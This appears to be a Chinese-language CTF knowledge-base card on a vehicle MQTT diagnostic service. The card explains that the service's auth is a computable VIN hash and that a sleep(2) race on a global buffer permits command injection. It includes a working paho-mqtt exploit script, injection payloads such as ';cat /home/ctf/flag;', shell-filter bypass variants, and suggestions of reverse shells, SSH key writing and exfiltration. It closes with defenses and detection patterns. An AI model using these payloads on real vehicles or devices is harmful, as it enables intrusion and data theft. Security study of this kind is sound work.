---
id: iot-protocol-mqtt-vin-hash-auth-set-vin-command-injection
title: 车联网 MQTT 诊断服务：VIN 的 31 进制滚动哈希当 auth，set_vin 全局 arg 经 sleep(2) 竞态注入读 flag
type: scenario
domain: iot
path: iot/protocol
technique: mqtt-vin-hash-auth-set-vin-command-injection
tags:
- iot
- mqtt
- vehicle
- vin
- toctou
- race-condition
- global-buffer
- command-injection
- paho
- cjson
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V171
  verified_at: '2026-11-06T17:48:28+08:00'
  notes: 90899 图08 显示首条合法 set_vin 后第二条注入消息触发 invalid_vin，但命令 echo -n 1234567890123;cat /flag>/mnt/VIN;cat /mnt/VIN 仍执行并回显 flag；已结合 90835 源码核对 sub_158A 仅允许 10–63 位字母数字、set_vin 校验后 sleep(2) 再用全局 src 拼 popen，确认真正绕过为校验-使用分离的多线程 TOCTOU，非 auth 可计算或单纯未过滤；卡片已由 V177 修正，本 verifier 复核并将 aliases/tags 中的 auth-bypass 改为 TOCTOU/race-condition，补充 90899 的 valid_arg;cat /flag 变体；未本机复跑。
url: /docs/iot/protocol/iot-protocol-mqtt-vin-hash-auth-set-vin-command-injection/
draft: false
kb_aliases:
- MQTT 车联网命令注入
- VIN 哈希 auth 计算
- set_vin 全局 arg 竞态
- 校验-使用分离 TOCTOU
- Paho MQTT 诊断服务
- diag/resp 回显 flag
---

## 一句话结论

车联网 MQTT 诊断服务把 `auth` 设计成 VIN 的 31 进制滚动哈希（`h = 31*h + c`），而 VIN 可从 `/mnt/VIN` 或服务自身上报的 JSON 获得，因此 auth 不是秘密；`set_vin` 分支虽然用 `sub_158A` 把 arg 限制为 10–63 位字母数字，但回调把 arg 拷进全局 `src` 后立即起线程，首个线程在 `sleep(2)` 之后才用同一个全局 `src` 拼 `popen("echo -n %s>/mnt/VIN;cat /mnt/VIN")`；攻击者先发合法 arg 让首个线程进入 sleep，再发一条带 `;cat /home/ctf/flag;` 的消息覆盖全局 `src`（该消息自身会校验失败，但不影响首个线程后续使用），即可命令注入并通过 `diag/resp` 回显。

## 原理

- **服务结构**：程序用 Paho MQTT C 连接 `tcp://localhost:9999`，client id `vehicle_diag`，订阅 `diag` 主题；`MQTTClient_setCallbacks` 把消息回调设为 `handle`，收到消息后解析 JSON 的 `auth`、`cmd`、`arg` 三个字段，`strncpy` 到全局变量并 `pthread_create(start_routine)` 执行。
- **auth 是可计算的哈希**：`sub_1509` 对 `/mnt/VIN` 内容做多项式滚动哈希：
  `v3 = 31 * v3 + *p++`（int 回绕），再 `sprintf("%08x")`。VIN 通常可读（`/mnt/VIN`、启动时上报的 `{"vin":"..."}`），所以攻击者可以离线算出同样的 auth，认证不构成秘密。
- **校验与使用分离的竞态**：消息回调 `sub_1C8C` 把 JSON 的 `auth/cmd/arg` 分别 `strncpy` 到全局 `s1`/`dest_0`/`src`，随后 `pthread_create(start_routine)`；`start_routine` 在 `set_vin` 分支先调 `sub_158A(src)`，该函数要求长度 10–63 且每个字符都通过 `__ctype_b_loc` 字母数字判定，直接带 `;`、`/` 的 arg 会被拒绝。通过校验后线程 `sleep(2)`，再用**全局** `src` 执行 `snprintf(s, 0x100, "echo -n %s>/mnt/VIN;cat /mnt/VIN", src)` + `popen`。第二条消息进入回调时会先把注入串写进同一全局 `src`；它的 `start_routine` 虽然会在 `sub_158A` 失败并回 `invalid_vin`，但首个仍在 sleep 的线程醒来后读取的已是被覆盖的全局 `src`，从而把注入串拼进 shell 命令。
- **回显通道**：命令输出通过 `send`/`MQTTClient_publishMessage` 发布到 `diag/resp`，任何能订阅该主题的客户端都能收到 `ret: ...`，因此盲注入变成可回显。
- **时间窗口**：原文 exp 先发一条合法 `set_vin`（arg 长度满足校验），让首个 `start_routine` 进入 `sleep(2)`；约 1 秒后再发带 `;cat /home/ctf/flag;` 的注入消息覆盖全局 `src`，首个线程醒来执行注入命令。最终回显 `ret: <合法arg>flag{...}`。
- **为什么成立**：认证只校验“知道 VIN 的哈希”，不校验消息来源或签名；业务层把消息字段交给 shell 解析；MQTT broker 允许匿名 publish/subscribe（题目配置 `allow_anonymous true`）。

## 触发条件

- 目标运行 MQTT 客户端并订阅固定命令主题（如 `diag`），消息回调解析 JSON 的 `auth/cmd/arg`。
- auth 是可由 VIN 或其它可获取信息离线计算出的哈希/固定值，不是随机 secret。
- `set_vin`（或其它命令）把 arg 拼接进 `system`/`popen` 等 shell 命令；即使存在字符白名单，只要校验与真正使用之间隔着 `sleep`/异步线程且使用全局缓冲区，仍可被第二条消息覆盖。
- 回调把每条消息的 arg 写入同一个全局缓冲区，且异步线程在延迟后使用该缓冲区（校验-使用分离/TOCTOU）。
- 攻击者可连接 broker 并 publish 到命令主题、subscribe 到响应主题（匿名或凭据泄露）。
- 命令结果有回显主题（如 `diag/resp`），或可通过副作用（写文件/外带）观察。

## 利用步骤

1. 获取 VIN：读取 `/mnt/VIN`、抓取服务启动上报的 `{"vin":"..."}`，或从固件/配置中提取。
2. 计算 auth：`v3=0; for c in vin: v3=(31*v3+ord(c)) & 0xffffffff; auth=f"{v3:08x}"`。
3. 连接 MQTT broker（端口 9999），订阅 `diag/resp`。
4. 先发一条合法 `set_vin`，`arg` 为 10–63 位字母数字（如 `1234567890123`），通过 `sub_158A` 并让首个线程进入 `sleep(2)`。
5. 约 1 秒后发送第二条消息：`{"auth": auth, "cmd": "set_vin", "arg": ";cat /home/ctf/flag;"}`。该消息的 `start_routine` 会因 `sub_158A` 失败，但回调已把注入串写入全局 `src`；首个线程醒来后用被覆盖的 `src` 执行 `popen`。
6. 从 `diag/resp` 读取回显（形如 `ret: 1234567890123flag{...}`）；若命令被截断，改用 `;cat${IFS}/flag;` 等短 payload。
7. 也可把 `cat /flag` 换成反弹 shell、写 SSH key、下载二阶段等。

## PoC

原文 exp（paho-mqtt，按目标调整 broker/端口/VIN）：

```python
import paho.mqtt.client as mqtt
import time
from json import dumps

broker = '127.0.0.1'
port = 9999
client_id = "python_client"
vin = '123\n'

def compute_hash(dest: str) -> str:
    v3 = 0
    for ch in dest:
        v3 = (31 * v3 + ord(ch)) & 0xFFFFFFFF
    return f"{v3:08x}"

auth = compute_hash(vin)

def on_connect(client, userdata, flags, rc):
    client.subscribe("diag/resp")

def on_message(client, userdata, msg):
    print(f"FLAG FOUND: {msg.payload.decode()}")

client = mqtt.Client(client_id)
client.on_connect = on_connect
client.on_message = on_message
client.connect(broker, port, 60)
client.subscribe("diag/resp")
client.loop_start()                  # 必须先起网络循环，两条消息才能按时间窗发出

valid_arg = "1234567890123"          # 10–63 位字母数字，通过 sub_158A
client.publish('diag', dumps({'auth': auth, 'cmd': 'set_vin', 'arg': valid_arg}))
time.sleep(1)                        # 首个线程已进入 sleep(2)

# 第二条消息覆盖全局 src；它自身会在 sub_158A 失败，但首个线程醒来后使用被覆盖的 src
client.publish('diag', dumps({'auth': auth, 'cmd': 'set_vin',
                              'arg': ";cat /home/ctf/flag;"}))

time.sleep(5)
client.loop_stop()
client.disconnect()
```

回显形态（原文图）：

```text
Receive: {"auth": "00170818", "cmd": "set_vin", "arg": ";cat /home/ctf/flag;"}
ret: 1234567890123flag{1111}
```

## 变体与关联

- 变体：auth 若为 VIN 哈希的变体（不同基数/大小写/换行），按 `/mnt/VIN` 实际内容逐字节重算；VIN 末尾的 `\n` 也要计入。
- 变体：第二条消息也可把注入串接在合法 arg 后（如 90899 题解中的 `1234567890123;cat /flag`），等价于在 `sleep(2)` 窗口覆盖全局 `src`；最终命令形如 `echo -n 1234567890123;cat /flag>/mnt/VIN;cat /mnt/VIN`。
- 变体：`arg` 长度受限时用 `${IFS}`、`$IFS$9`、Tab、通配符 `/*flag*`、`cat</flag` 缩短 payload；或用 `$(...)`/反引号。
- 变体：无回显主题时，把命令改为写 `/mnt/VIN`、写 Web 目录、DNS/HTTP 外带或反弹 shell。
- 关联：[[iot-protocol-mqtt-callback-clientid-filter-global-cmd-buffer-injection]]（MQTT 回调 + 全局 cmd 缓冲区的两阶段命令注入）、[[iot-protocol-dlink-dir645-ssdpcgi-command-injection]]（IoT 环境变量进 shell）、[[pentest-recon-frontend-js-aes-key-encrypted-credential-mqtt-validation]]（前端凭据泄露后实测 MQTT 权限）。

## 检测与防御

- **认证设计**：不要把可公开/可推算的 VIN 哈希当认证 secret；使用每设备独立密钥、HMAC/签名、TLS 客户端证书，并校验消息来源与时间戳/随机数。
- **命令执行**：不要用 `system`/`popen` 拼接 MQTT 字段；改用 `execve`/`posix_spawn` 传 argv，或对 `arg` 做严格白名单（如仅 `[A-Za-z0-9_.-]`）并拒绝 `;|&$()` 等元字符。
- **MQTT 配置**：关闭匿名访问，启用 broker 认证与 topic ACL，限制 publish/subscribe 权限；对消息大小和 JSON schema 做校验。
- **检测**：MQTT payload 中出现 `;`、`|`、`&&`、`$(`、反引号、`/flag`、`${IFS}` 等；同一 client 短时间连续 publish 合法与注入两条 `set_vin`；`diag/resp` 出现命令输出格式；目标进程派生 `sh -c`。
- **响应**：轮换 broker 凭据与设备密钥，审计 `/mnt/VIN` 是否被篡改，检查 flag/敏感文件访问与命令副作用。
